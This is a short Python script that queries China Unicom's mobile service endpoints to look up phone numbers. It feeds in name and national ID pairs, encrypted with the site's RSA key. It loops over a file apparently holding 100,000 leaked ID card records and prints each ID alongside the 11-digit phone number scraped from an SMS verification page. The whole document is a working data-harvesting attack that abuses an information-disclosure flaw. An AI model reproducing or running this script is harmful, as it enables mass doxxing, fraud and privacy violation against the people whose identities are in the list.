#from 小云
from Crypto.PublicKey import RSA
from urllib.parse import quote
import requests
from Crypto.Cipher import PKCS1_v1_5
import base64
import re

#global 
provs= {11:"011",12:"012",13:"018",14:"019",15:"010",21:"091",22:"090",23:"097",31:"031",32:"034",33:"036",34:"030",35:"038",36:"075",37:"017",41:"076",42:"071",43:"074",44:"051",45:"059",46:"050",50:"083",51:"081",52:"085",53:"086",54:"079",61:"084",62:"087",63:"070",64:"088",65:"089+"}
pk="""-----BEGIN PUBLIC KEY-----
    MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBALNflQ3EdFdC3gFmD4ElXBajYlo5/eNceSzMquB8pRHZzjuCA6vw2Zmoveb+cwZes90NpXqXNMqSmc6rE8ppVn8CAwEAAQ==
-----END PUBLIC KEY-----"""

def RSA_E(str):
    global pk
    rsakey = RSA.importKey(pk)
    cipher =PKCS1_v1_5.new(rsakey)
    cipher_text = base64.b64encode(cipher.encrypt(str.encode('utf-8')))
    return quote(cipher_text.decode('utf-8'))

def get(url,headers=None):
    if headers==None:
        res=requests.get(url,headers=headers)
    else:
        res=requests.get(url,headers=headers)
    return (res.text,res.headers)
def post(url,headers=None,data={"":""}):
    if headers==None:
        res=requests.post(url,headers=headers,data=data)
    else:
        res=requests.post(url,headers=headers,data=data)
    return (res.text,res.headers)

def getProvId(idC):
    global provs
    tid=idC[0:2]
    return provs[int(tid)]


def getNum(id,name,ccode,pcode):
    head={}
    data={}
    data["idCard"]=RSA_E(id)
    data["cityCode"]=ccode
    data["provCode"]=pcode
    data["certName"]=RSA_E(name)
    cookies=post("http://m.client.10010.com/mobileService/broad/authenticationMode.htm",None,data)[1]['Set-Cookie']
    head["Cookie"]=cookies
    #获取结果
    res=get("http://m.client.10010.com/mobileService/broad/smsVerification.htm",head)
    r=res[0]
    rc=re.compile(r"<span>\d{11,11}</span>")
    num=rc.search(r).group()[6:17]
    return num
    



#获取cookies


file="./10万身份证数据.txt"



for line in open(file):
    s=line.split("---",1)
    id=s[1]
    name=s[0]
    ccode="777"
    pcode=getProvId(id)
    num=getNum(id,name,ccode,pcode)
    print(id.strip()+":"+num)
